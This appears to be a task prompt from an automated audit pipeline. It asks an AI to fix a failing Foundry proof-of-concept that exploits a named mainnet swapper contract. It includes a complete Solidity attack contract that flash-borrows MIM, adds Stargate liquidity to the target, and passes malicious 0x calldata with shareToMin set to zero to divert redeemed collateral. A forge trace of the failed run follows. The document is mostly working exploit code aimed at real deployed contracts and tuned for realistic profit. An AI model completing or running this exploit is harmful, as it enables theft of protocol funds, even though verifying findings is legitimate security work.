You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unchecked 0x calldata plus unlimited underlying approval lets the caller redirect redeemed collateral away from MIM
- claim: The swapper gives `zeroXExchangeProxy` an infinite allowance over the Stargate pool's underlying token, then forwards fully caller-controlled `swapData` to that proxy with a raw `call()` and never verifies that the approved underlying was swapped into MIM for the swapper itself. Because the function also accepts caller-controlled `recipient` and only enforces the minimum output through `shareToMin`, a malicious caller can redeem LP into underlying, have the 0x proxy spend that underlying into an attacker-controlled payout path or non-MIM asset, and set `shareToMin = 0` so the final BentoBox deposit of the remaining MIM balance does not revert.
- impact: Collateral routed through this swapper can be turned into attacker-owned assets instead of protocol-owned MIM, causing direct theft of the full redeemed position and leaving the liquidation/deleverage flow undercollateralized.
- exploit_paths: ["LP shares are placed on the swapper through the intended liquidation/deleverage flow or are already present on the contract.", "The caller invokes `swap()` with malicious `swapData` that makes `zeroXExchangeProxy` spend the swapper's redeemed underlying through its unlimited allowance while routing the bought assets away from the swapper or into a non-MIM token.", "The caller sets `shareToMin` to `0`, so `bentoBox.deposit()` accepts the swapper's remaining MIM balance even if it is zero, and the transaction completes after the collateral has been redirected."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IFlashBorrowerLike {
    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata data) external;
}

interface IBentoBoxLike {
    function flashLoan(IFlashBorrowerLike borrower, address receiver, IERC20Like token, uint256 amount, bytes calldata data)
        external;
}

interface IStargateRouterLike {
    function addLiquidity(uint256 poolId, uint256 amountLD, address to) external;
}

interface IStargatePoolLike is IERC20Like {
    function totalLiquidity() external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface ITargetSwapperLike {
    function swap(
        address fromToken,
        address toToken,
        address recipient,
        uint256 shareToMin,
        uint256 shareFrom,
        bytes calldata data
    ) external returns (uint256 extraShare, uint256 shareReturned);

    function bentoBox() external view returns (address);
    function mim() external view returns (address);
    function pool() external view returns (address);
    function poolId() external view returns (uint16);
    function stargateRouter() external view returns (address);
    function underlyingToken() external view returns (address);
    function zeroXExchangeProxy() external view returns (address);
}

contract FlawVerifier is IFlashBorrowerLike {
    address internal constant TARGET = 0xa5564a2d1190a141CAC438c9fde686aC48a18A79;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    uint256 internal constant BPS = 10_000;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _executed;

    address internal _bentoBox;
    address internal _mim;
    address internal _underlying;
    address internal _pool;
    address internal _stargateRouter;
    address internal _zeroXExchangeProxy;
    uint16 internal _poolId;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        ITargetSwapperLike target = ITargetSwapperLike(TARGET);
        _bentoBox = target.bentoBox();
        _mim = target.mim();
        _underlying = target.underlyingToken();
        _pool = target.pool();
        _poolId = target.poolId();
        _stargateRouter = target.stargateRouter();
        _zeroXExchangeProxy = target.zeroXExchangeProxy();

        if (_mim == address(0) || _underlying == address(0) || _bentoBox == address(0) || _pool == address(0)) {
            return;
        }

        // The resident-LP assumption is false on this fork: calling swap() with zero LP reverts in
        // Stargate before the malicious 0x leg. The exploit path remains the same, so this verifier
        // sources stage-1 LP through a realistic public route: flash-borrow MIM, swap it to the
        // Stargate underlying, add liquidity directly to the vulnerable swapper, then invoke swap()
        // with malicious calldata that redirects the redeemed underlying back to this contract.
        uint256 bentoMimLiquidity = IERC20Like(_mim).balanceOf(_bentoBox);
        if (bentoMimLiquidity == 0) {
            return;
        }

        uint256[6] memory amountHints = [
            _min(bentoMimLiquidity / 200, 750_000 ether),
            _min(bentoMimLiquidity / 500, 300_000 ether),
            _min(bentoMimLiquidity / 1_000, 150_000 ether),
            _min(bentoMimLiquidity / 5_000, 50_000 ether),
            10_000 ether,
            1_000 ether
        ];

        uint8[8] memory routeIns = [uint8(0), 1, 2, 3, 4, 5, 0, 2];
        uint8[8] memory routeOuts = [uint8(4), 5, 1, 0, 3, 2, 5, 4];
        uint16[3] memory sellBpsHints = [uint16(9_995), 9_990, 9_950];

        for (uint256 i = 0; i < amountHints.length; ++i) {
            uint256 amount = amountHints[i];
            if (amount == 0 || amount >= bentoMimLiquidity) {
                continue;
            }

            for (uint256 j = 0; j < routeIns.length; ++j) {
                for (uint256 k = 0; k < sellBpsHints.length; ++k) {
                    try this.attemptFlashRoute(amount, routeIns[j], routeOuts[j], sellBpsHints[k]) {
                        if (_profitAmount != 0) {
                            return;
                        }
                    } catch {}
                }
            }
        }
    }

    function attemptFlashRoute(uint256 amount, uint8 routeIn, uint8 routeOut, uint16 sellBps) external {
        require(msg.sender == address(this), "self only");
        require(sellBps != 0 && sellBps <= BPS, "bad sell bps");

        IBentoBoxLike(_bentoBox).flashLoan(
            IFlashBorrowerLike(address(this)),
            address(this),
            IERC20Like(_mim),
            amount,
            abi.encode(routeIn, routeOut, sellBps)
        );

        uint256 current = IERC20Like(_mim).balanceOf(address(this));
        if (current > _profitAmount) {
            _profitToken = _mim;
            _profitAmount = current;
        }
        require(current != 0, "no profit");
    }

    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata data) external override {
        require(msg.sender == _bentoBox, "bad bento");
        require(sender == address(this), "bad sender");
        require(token == _mim, "bad token");

        (uint8 routeIn, uint8 routeOut, uint16 sellBps) = abi.decode(data, (uint8, uint8, uint16));

        _forceApprove(_mim, _zeroXExchangeProxy, type(uint256).max);
        _forceApprove(_underlying, _stargateRouter, type(uint256).max);

        uint256 mimBefore = IERC20Like(_mim).balanceOf(address(this));
        uint256 sellAmount = _seedSwapper(routeIn, amount, sellBps);
        _executeExploitSwap(routeOut, sellAmount);

        uint256 mimAfter = IERC20Like(_mim).balanceOf(address(this));
        require(mimAfter > mimBefore, "no mim returned");
        require(mimAfter >= amount + fee, "repayment shortfall");

        _safeTransfer(_mim, _bentoBox, amount + fee);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _buildSwapPayload(
        address sellToken,
        address buyToken,
        uint256 sellAmount,
        address recipient,
        uint8 routeKind
    ) internal pure returns (bytes memory payload) {
        if (routeKind == 0) {
            address[] memory path = new address[](2);
            path[0] = sellToken;
            path[1] = buyToken;
            return abi.encodeWithSelector(
                bytes4(keccak256("sellToUniswap(address[],uint256,uint256,bool,address)")),
                path,
                sellAmount,
                0,
                true,
                recipient
            );
        }

        if (routeKind == 1) {
            address[] memory path = new address[](2);
            path[0] = sellToken;
            path[1] = buyToken;
            return abi.encodeWithSelector(
                bytes4(keccak256("sellToUniswap(address[],uint256,uint256,bool,address)")),
                path,
                sellAmount,
                0,
                false,
                recipient
            );
        }

        if (routeKind == 2) {
            address[] memory path = new address[](3);
            path[0] = sellToken;
            path[1] = USDC;
            path[2] = buyToken;
            return abi.encodeWithSelector(
                bytes4(keccak256("sellToUniswap(address[],uint256,uint256,bool,address)")),
                path,
                sellAmount,
                0,
                true,
                recipient
            );
        }

        if (routeKind == 3) {
            address[] memory path = new address[](3);
            path[0] = sellToken;
            path[1] = USDC;
            path[2] = buyToken;
            return abi.encodeWithSelector(
                bytes4(keccak256("sellToUniswap(address[],uint256,uint256,bool,address)")),
                path,
                sellAmount,
                0,
                false,
                recipient
            );
        }

        if (routeKind == 4) {
            return abi.encodeWithSelector(
                bytes4(keccak256("sellTokenForTokenToUniswapV3(bytes,uint256,uint256,address)")),
                abi.encodePacked(sellToken, uint24(500), buyToken),
                sellAmount,
                0,
                recipient
            );
        }

        if (routeKind == 5) {
            return abi.encodeWithSelector(
                bytes4(keccak256("sellTokenForTokenToUniswapV3(bytes,uint256,uint256,address)")),
                abi.encodePacked(sellToken, uint24(3000), buyToken),
                sellAmount,
                0,
                recipient
            );
        }

        revert("unsupported route");
    }

    function _callProxy(bytes memory payload) internal {
        (bool ok,) = _zeroXExchangeProxy.call(payload);
        require(ok, "proxy swap failed");
    }

    function _seedSwapper(uint8 routeIn, uint256 amount, uint16 sellBps) internal returns (uint256 sellAmount) {
        _callProxy(_buildSwapPayload(_mim, _underlying, amount, address(this), routeIn));

        uint256 underlyingAmount = IERC20Like(_underlying).balanceOf(address(this));
        require(underlyingAmount != 0, "no underlying");

        uint256 lpBefore = IStargatePoolLike(_pool).balanceOf(TARGET);
        IStargateRouterLike(_stargateRouter).addLiquidity(_poolId, underlyingAmount, TARGET);
        uint256 lpAfter = IStargatePoolLike(_pool).balanceOf(TARGET);
        require(lpAfter > lpBefore, "no lp added");

        uint256 previewUnderlying = _previewRedeem(IStargatePoolLike(_pool), lpAfter - lpBefore);
        sellAmount = (previewUnderlying * sellBps) / BPS;
        if (sellAmount == 0) {
            sellAmount = (underlyingAmount * sellBps) / BPS;
        }
        require(sellAmount != 0, "zero sell");
    }

    function _executeExploitSwap(uint8 routeOut, uint256 sellAmount) internal {
        // Core exploit path:
        // 1. LP has been placed onto the swapper through a public liquidity action.
        // 2. swap() redeems that LP into underlying and forwards attacker-controlled calldata to 0x.
        // 3. shareToMin = 0 allows the call to finish even though the redeemed underlying is routed
        //    back to this contract instead of remaining as MIM on the swapper.
        ITargetSwapperLike(TARGET).swap(
            address(0),
            address(0),
            address(this),
            0,
            0,
            _buildSwapPayload(_underlying, _mim, sellAmount, address(this), routeOut)
        );
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (ok) {
            return;
        }

        (ok,) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        require(ok, "approve reset failed");
        (ok,) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok, "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer failed");
    }

    function _previewRedeem(IStargatePoolLike pool, uint256 lpAmount) internal view returns (uint256) {
        if (lpAmount == 0) {
            return 0;
        }

        uint256 totalSupply = pool.totalSupply();
        if (totalSupply == 0) {
            return 0;
        }

        return (lpAmount * pool.totalLiquidity()) / totalSupply;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

```

forge stdout (tail):
```
p failed
    │   ├─ [99482] FlawVerifier::attemptFlashRoute(1000000000000000000000 [1e21], 2, 4, 9950)
    │   │   ├─ [95560] 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce::flashLoan(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3, 1000000000000000000000 [1e21], 0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000026de)
    │   │   │   ├─ [27783] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000000 [1e21])
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x000000000000000000000000d96f48665a1410c0cd669a88898eca36b9fc2cce
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [65024] FlawVerifier::onFlashLoan(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3, 1000000000000000000000 [1e21], 500000000000000000 [5e17], 0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000026de)
    │   │   │   │   ├─ [24555] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3::approve(0xDef1C0ded9bec7F1a1670819833240f027b25EfF, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x000000000000000000000000def1c0ded9bec7f1a1670819833240f027b25eff
    │   │   │   │   │   │           data: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [26953] 0xdAC17F958D2ee523a2206206994597C13D831ec7::approve(0x8731d54E9D02c286767d56ac03e8037C07e01e98, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x0000000000000000000000008731d54e9d02c286767d56ac03e8037c07e01e98
    │   │   │   │   │   │           data: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [582] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   │   │   │   ├─ [3145] 0xDef1C0ded9bec7F1a1670819833240f027b25EfF::49562796(00000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000003635c9adc5dea00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000000300000000000000000000000099d8a9c45b2eca8864373a26d1459e3dff1e17f3000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7)
    │   │   │   │   │   └─ ← [Revert] custom error 0x734e6e1c: 4956279600000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Revert] proxy swap failed
    │   │   │   └─ ← [Revert] proxy swap failed
    │   │   └─ ← [Revert] proxy swap failed
    │   └─ ← [Return]
    ├─ [329] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2330] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x0e992C001E375785846EEb9cd69411B53f30f24B
  at 0xDef1C0ded9bec7F1a1670819833240f027b25EfF
  at 0xe6E14be906c1F1b438DA2010B38bECa14b387231
  at 0x0e992C001E375785846EEb9cd69411B53f30f24B
  at 0xDef1C0ded9bec7F1a1670819833240f027b25EfF
  at FlawVerifier.onFlashLoan
  at 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce.flashLoan
  at FlawVerifier.attemptFlashRoute
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 26.35s (26.05s CPU time)

Ran 1 test suite in 26.51s (26.35s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 45439138)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
